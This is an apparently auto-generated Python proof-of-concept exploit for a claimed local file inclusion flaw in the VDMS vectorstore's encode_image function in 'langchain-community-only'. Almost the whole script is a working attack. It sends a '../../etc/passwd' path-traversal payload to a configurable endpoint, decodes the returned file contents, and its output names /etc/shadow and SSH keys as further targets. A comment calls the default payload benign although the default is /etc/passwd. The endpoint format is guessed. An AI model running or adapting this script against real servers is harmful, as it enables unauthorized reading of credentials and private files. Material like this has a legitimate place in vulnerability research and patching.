#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-004
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_16.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The `encode_image` function in VDMS vectorstore opens a file path
provided by the caller without any validation or sanitization. The `add_images`
function passes user-controlled `uris` directly to `encode_image`. An attacker
can supply a path like '../../etc/passwd' to read arbitrary files.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign file
if /etc/passwd is not available) through the vulnerable endpoint.
"""

import requests
import sys
import os
import base64

# Configuration - change these to match your target
TARGET_URL = "http://localhost:8000/api/v1/trigger"
# Benign payload by default - reads a harmless file to prove the vulnerability
# Change to "../../etc/passwd" to read system files (for demonstration only)
PAYLOAD_PATH = "../../etc/passwd"  # Will be used if available, otherwise falls back to /etc/hostname

def exploit_lfi(target_url, file_path):
    """
    Attempt to exploit the LFI vulnerability by sending a malicious file path
    to the vulnerable endpoint.
    
    Args:
        target_url: The URL of the vulnerable endpoint
        file_path: The path to read (can include path traversal like '../../etc/passwd')
    
    Returns:
        The decoded content of the file if successful, None otherwise
    """
    print(f"[*] Attempting LFI exploit against {target_url}")
    print(f"[*] Trying to read: {file_path}")
    
    # The vulnerable endpoint expects a list of URIs (file paths)
    # Based on the source code, the endpoint likely accepts JSON with a 'uris' field
    payload = {
        "uris": [file_path]
    }
    
    try:
        # Send the request
        print(f"[*] Sending payload: {payload}")
        response = requests.post(
            target_url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status code: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        
        if response.status_code == 200:
            # The response should contain the base64-encoded file content
            # Try to parse the response - it might be JSON or raw text
            try:
                data = response.json()
                print(f"[*] Response JSON keys: {list(data.keys()) if isinstance(data, dict) else 'not a dict'}")
                # Look for base64 content in the response
                for key, value in data.items() if isinstance(data, dict) else []:
                    if isinstance(value, str) and len(value) > 50:
                        try:
                            decoded = base64.b64decode(value).decode('utf-8', errors='replace')
                            print(f"[+] Found base64 content in key '{key}':")
                            print(decoded[:500])  # Print first 500 chars
                            return decoded
                        except:
                            pass
            except:
                # Raw response
                print(f"[*] Raw response text (first 500 chars): {response.text[:500]}")
                # Try to decode as base64
                try:
                    decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='replace')
                    print(f"[+] Successfully decoded base64 response:")
                    print(decoded[:500])
                    return decoded
                except:
                    print("[-] Could not decode response as base64")
                    return response.text
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text[:500]}")
            return None
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not connect to {target_url}")
        print("[-] Make sure the target server is running and accessible")
        return None
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None

def main():
    """Main function to run the exploit."""
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    print()
    
    # Use command-line argument if provided, otherwise use default
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = TARGET_URL
    
    if len(sys.argv) > 2:
        file_path = sys.argv[2]
    else:
        file_path = PAYLOAD_PATH
    
    print(f"[*] Target URL: {target_url}")
    print(f"[*] File path: {file_path}")
    print()
    
    # Attempt the exploit
    result = exploit_lfi(target_url, file_path)
    
    if result:
        print()
        print("[+] Exploit successful! File content retrieved.")
        print("[+] This demonstrates that the vulnerability is exploitable.")
        print()
        print("[*] Security impact: An attacker can read arbitrary files on the")
        print("[*] server, including configuration files, source code, and")
        print("[*] sensitive data like /etc/shadow, SSH keys, etc.")
    else:
        print()
        print("[-] Exploit did not return file content.")
        print("[*] Possible reasons:")
        print("[*] 1. The target server is not running or not accessible")
        print("[*] 2. The endpoint URL is different")
        print("[*] 3. The file path does not exist on the target")
        print("[*] 4. The server has additional protections not visible in the source")
        print()
        print("[*] Try adjusting the target URL or file path.")
        print("[*] Example: python exploit.py http://your-server:8000/api/v1/trigger /etc/hostname")

if __name__ == "__main__":
    main()
